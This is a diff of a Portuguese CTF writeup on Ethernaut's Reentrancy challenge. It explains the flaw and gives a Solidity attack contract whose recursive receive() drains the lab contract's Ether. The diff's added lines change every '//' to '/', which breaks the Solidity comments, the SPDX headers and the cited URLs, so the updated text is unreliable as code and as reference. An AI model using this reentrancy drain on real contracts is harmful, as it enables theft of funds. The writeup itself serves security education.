@@ -16,7 +16,7 @@ series = ["Writeups"]
 
 
 Neste writeup, apresentamos a resolução do desafio **“Reentrancy”**, do **CTF Ethernaut** (OpenZeppelin), que explora a exploração de um contrato inteligente vulnerável à falha de mesmo nome.
-A vulnerabilidade **Reentrancy** é classificada no **OWASP TOP 10 2025** como **SC05:2025** ([OWASP Smart Contract Top 10](https://owasp.org/www-project-smart-contract-top-10/)) e já foi explorada em diversos ataques notáveis, como:
+A vulnerabilidade **Reentrancy** é classificada no **OWASP TOP 10 2025** como **SC05:2025** ([OWASP Smart Contract Top 10](https:/owasp.org/www-project-smart-contract-top-10/)) e já foi explorada em diversos ataques notáveis, como:
 
 - **The DAO Hack (2016)**
 - **Protocolo bZx (2020)**
@@ -26,12 +26,12 @@ A vulnerabilidade **Reentrancy** é classificada no **OWASP TOP 10 2025** como *
 Dentre outros casos, esses ataques resultaram em prejuízos financeiros massivos para as empresas afetadas.
 
 
-![](../attachment//0b5e7dc7ebea1727718fdb4d07662179.png)
+![](../attachment/0b5e7dc7ebea1727718fdb4d07662179.png)
 
 
 O desafio começa com a seguinte proposta:
 
-![](../attachment//680f5ead4ca7a0f7a135ed3b7d45f52c.png)
+![](../attachment/680f5ead4ca7a0f7a135ed3b7d45f52c.png)
 
 ```
 O objetivo deste nível é que você roube todos os fundos do contrato.
@@ -47,10 +47,10 @@ O objetivo deste nível é que você roube todos os fundos do contrato.
 
 Junto ao código do contrato implementado:
 
-![](../attachment//5605e192f80bae1ffe0e9d8a5e85ec17.png)
+![](../attachment/5605e192f80bae1ffe0e9d8a5e85ec17.png)
 
 ```
-// SPDX-License-Identifier: MIT
+/ SPDX-License-Identifier: MIT
 pragma solidity ^0.6.12;
 import "openzeppelin-contracts-06/math/SafeMath.sol";
 
@@ -88,7 +88,7 @@ Analisando o código, é possível identificar 3 (três) funções públicas:
 
 O objetivo do desafio é roubar todo o **Ethereum** armazenado no contrato, representando um total de 0.001 eth.
 
-![](../attachment//ff86fe209d0476bafd088cc40b01ab75.png)
+![](../attachment/ff86fe209d0476bafd088cc40b01ab75.png)
 
 Observando as funções expostas pelo contrato, foram realizadas algumas considerações.
 - A função **withdraw** requer que o valor do saque seja menor que o valor armazenado como saldo no endereço do usuário, armazenado no **mapping** `balances`. Trecho de código: (`if (balances[msg.sender] >= _amount) {`)
@@ -111,7 +111,7 @@ O contrato vulnerável realiza uma **chamada externa** (`call()`, no caso do con
 **Primeira Chamada do Atacante**:  
 O atacante, por meio de um contrato malicioso, deposita **Ether** no contrato vulnerável e chama a função de **saque** (`withdraw`). O contrato vulnerável **verifica** se há saldo suficiente e envia o Ether para o atacante.
 - Importante: Até então, o saldo interno do contrato não foi atualizado, já que a função `call()` foi chamada em um contrato externo.
-- Segundo a documentação, a função `call()` passa o contexto de execução para o contrato alvo: "*Calling a function on a different contract (instance) will perform an EVM function call and thus switch the context such that state variables in the calling contract are inaccessible*." - https://docs.soliditylang.org/en/latest/contracts.html
+- Segundo a documentação, a função `call()` passa o contexto de execução para o contrato alvo: "*Calling a function on a different contract (instance) will perform an EVM function call and thus switch the context such that state variables in the calling contract are inaccessible*." - https:/docs.soliditylang.org/en/latest/contracts.html
 
 **Execução da Função `receive()` do Atacante**:  
 Quando o contrato vulnerável envia **Ether** ao atacante, **a função `receive()`** do contrato malicioso é chamada automaticamente.  
@@ -128,7 +128,7 @@ O processo de reentrância se repete: a cada chamada de `receive()` e reentrada 
 A execução desse loop ocorre até que o gás acabe ou que todos os fundos do contrato sejam drenados.
 
 
-![](../attachment//4a18e8d9e57d38519568e8bfa6aca805.png)
+![](../attachment/4a18e8d9e57d38519568e8bfa6aca805.png)
 
 
 ## Exploit!
@@ -137,7 +137,7 @@ A execução desse loop ocorre até que o gás acabe ou que todos os fundos do c
 Para exploração da vulnerabilidade de reentrada, encontrada após a análise do contrato, é então criado um contrato malicioso conforme descrito abaixo.
 
 
-![](../attachment//0178a13de8653455b972f704064127cc.png)
+![](../attachment/0178a13de8653455b972f704064127cc.png)
 
 Funções criadas:
 - `exploitDonate()`: Realiza uma chamada ao método `donate` do contrato alvo, com uma transferência de um valor em **Ether**, necessário para cumprir o requisito do método `withdraw`.
@@ -147,7 +147,7 @@ Funções criadas:
 
 
 ```
-// SPDX-License-Identifier: GPL-3.0
+/ SPDX-License-Identifier: GPL-3.0
 
 pragma solidity >=0.8.2 <0.9.0;
 
@@ -172,14 +172,14 @@ contract Exploit {
 
   
 
-    // Função withdraw que requisita saque de valor especificado
+    / Função withdraw que requisita saque de valor especificado
     function exploitWithdraw() public payable {
         targetContract.withdraw(msg.value);
     }
 
   
 
-    // Função para sacar todo o saldo do contrato
+    / Função para sacar todo o saldo do contrato
     function withdrawAll(address payable _to) public {
         require(address(this).balance > 0, "Sem saldo para sacar");
         _to.transfer(address(this).balance);
@@ -187,7 +187,7 @@ contract Exploit {
 
   
 
-    // Recebe ETH e tenta realizar um saque do contrato externo
+    / Recebe ETH e tenta realizar um saque do contrato externo
     receive() external payable {
 	        if (address(targetContract).balance >= msg.value) targetContract.withdraw(msg.value);
     }
@@ -197,21 +197,21 @@ contract Exploit {
 
 A imagem abaixo demonstra o contrato criado já na blockchain.
 
-![](../attachment//026a4e99ece2fc20f5a9c051a1f7a283.png)
+![](../attachment/026a4e99ece2fc20f5a9c051a1f7a283.png)
 
 #### 1. Função `exploitDonate()`
 
 Enviando transação para depósito de 2 finney para contrato alvo.
 
-![](../attachment//3e3e1e492c88995fb22e8510c487b4e2.png)
+![](../attachment/3e3e1e492c88995fb22e8510c487b4e2.png)
 
 Valor total após deposito no contrato alvo:
 
-![](../attachment//319b8b62d377ed1edd3058717c0e0ab8.png)
+![](../attachment/319b8b62d377ed1edd3058717c0e0ab8.png)
 
 Registro da transação efetuada pelo contrato malicioso na blockchain após transferência de 0.002 finney.
 
-![](../attachment//052473cfb058735e3025efd15f551dd3.png)
+![](../attachment/052473cfb058735e3025efd15f551dd3.png)
 
 
 #### 2. Função `exploitWithdraw()` - Final!
@@ -227,7 +227,7 @@ O **gás** é uma unidade que mede o custo computacional necessário para execut
 Executando método `ExploitWithdraw()`, parte final para execução do ataque de *reentrancy*, visto que após essa chamada, todas as subsequentes irão ser executadas diretamente na função `receive()`.
 
 
-![](../attachment//603a9b68398d83237b8415d9e670cfc4.png)
+![](../attachment/603a9b68398d83237b8415d9e670cfc4.png)
 
 
 #### Aftermath
@@ -238,27 +238,27 @@ Sempre que o contrato alvo realizava uma transferência de **Ether** por meio do
 
 Essa falha permitiu que o contrato malicioso executasse a função de saque de forma **recursiva** até que o saldo do contrato alvo fosse totalmente drenado. 
 
-![](../attachment//d86a395e3da225108e0334086fe4509d.png)
+![](../attachment/d86a395e3da225108e0334086fe4509d.png)
 
 É possível observar o histórico de transações internas realizadas pelo contrato, com inúmeras transferências realizadas do contrato alvo para o malicioso.
 (em vermelho, transações recebidas pelo contrato alvo)
 
-![](../attachment//5ea6814af784252b6f8abeb35692ca99.png)
+![](../attachment/5ea6814af784252b6f8abeb35692ca99.png)
 
 #### Profit!
 
 Com o contrato malicioso em posse das reservas de **Ether** do contrato alvo, é possível realizar o saque de sua reversa interna para nossa carteira pessoal. 
 
 
-![](../attachment//e84f8d85710a58eb4467f9aee2ff2def.png)
+![](../attachment/e84f8d85710a58eb4467f9aee2ff2def.png)
 
 Estado da Carteira antes da realização do saque:
 
-![](../attachment//cbe18827d7ea464654de6447115abb5a.png)
+![](../attachment/cbe18827d7ea464654de6447115abb5a.png)
 
 
 Estado da Carteira depois da realização do saque:
 
-![](../attachment//4240605e3681136e0fd441ee5c991d40.png)
+![](../attachment/4240605e3681136e0fd441ee5c991d40.png)
 
 #### FIN!
